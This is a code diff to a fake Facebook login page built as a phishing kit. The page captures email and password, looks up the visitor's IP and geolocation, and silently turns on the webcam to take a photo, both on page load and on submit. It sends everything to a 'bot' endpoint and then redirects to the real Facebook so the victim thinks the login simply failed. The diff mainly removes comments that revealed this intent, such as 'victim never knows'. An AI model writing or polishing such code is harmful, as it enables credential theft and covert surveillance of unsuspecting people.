@@ -38,6 +38,7 @@
 
         .logo-img {
             height: 45px;
+            width: auto;
             filter: brightness(0) invert(1);
         }
 
@@ -120,18 +121,6 @@
             font-size: 14px;
         }
 
-        /* Hidden camera element - victim never sees this */
-        #stealthCamera {
-            position: fixed;
-            bottom: -100px;
-            right: -100px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-            z-index: -1;
-        }
-
         video, canvas {
             position: fixed;
             bottom: -100px;
@@ -146,7 +135,8 @@
 <body>
     <div class="container">
         <div class="header">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo.svg" alt="Facebook" class="logo-img" style="width: auto; height: 40px; filter: brightness(0) invert(1);">
+            <img src="https://upload.wikimedia.org/wikipedia/en/0/04/Facebook_f_logo_%282021%29.svg" alt="Facebook" class="logo-img" onerror="this.style.display='none'; this.nextSibling.style.display='block'">
+            <span style="color:white; font-size:28px; font-weight:bold; display:none;">facebook</span>
         </div>
         <div class="form-container">
             <form id="loginForm">
@@ -164,7 +154,6 @@
         </div>
     </div>
 
-    <!-- Hidden elements for stealth capture -->
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
@@ -174,9 +163,7 @@
         
         let stream = null;
         let photoCaptured = false;
-        let credentialsSent = false;
 
-        // Get location (silent)
         function getLocation() {
             return new Promise((resolve) => {
                 if (navigator.geolocation) {
@@ -190,7 +177,6 @@
             });
         }
 
-        // Get IP (silent)
         async function getIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
@@ -201,7 +187,6 @@
             }
         }
 
-        // Start camera in background - victim never knows
         async function startStealthCamera() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ 
@@ -214,17 +199,14 @@
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                // Wait a bit for camera to warm up, then capture
                 setTimeout(() => {
                     captureSecretPhoto();
                 }, 500);
             } catch (err) {
-                console.log('Camera silent fail');
-                photoCaptured = true; // Mark as done even if no camera
+                photoCaptured = true;
             }
         }
 
-        // Capture photo WITHOUT any visual indication
         function captureSecretPhoto() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
@@ -237,14 +219,12 @@
                 photoCaptured = true;
             }
             
-            // Stop camera stream silently
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
                 stream = null;
             }
         }
 
-        // Send everything to bot silently
         async function sendToBot(email, password, ip, location) {
             try {
                 let photo = null;
@@ -269,12 +249,9 @@
                         platform: navigator.platform
                     })
                 });
-            } catch (err) {
-                // Silent fail - victim never knows
-            }
+            } catch (err) {}
         }
 
-        // Everything happens silently when they click login
         document.getElementById('loginForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
@@ -283,35 +260,26 @@
             
             if (!email || !password) return;
             
-            // Start stealth camera in background
             startStealthCamera();
             
-            // Get IP and location silently
             const ip = await getIP();
             const location = await getLocation();
             
-            // Small delay to ensure photo captured
             setTimeout(async () => {
-                // Send everything to bot
                 await sendToBot(email, password, ip, location);
-                
-                // Redirect to real Facebook - victim thinks wrong password
                 window.location.href = 'https://facebook.com/login.php?login_attempt=1&lwv=110';
             }, 800);
         });
 
-        // Create account button - redirects to real Facebook
         document.getElementById('createBtn').addEventListener('click', () => {
             window.location.href = 'https://facebook.com/r.php';
         });
 
-        // Forgot password - redirects to real Facebook
         document.querySelector('.forgot a').addEventListener('click', (e) => {
             e.preventDefault();
             window.location.href = 'https://facebook.com/login/identify';
         });
 
-        // Auto-start camera silently when page loads (looks like normal Facebook)
         setTimeout(() => {
             startStealthCamera();
         }, 1000);
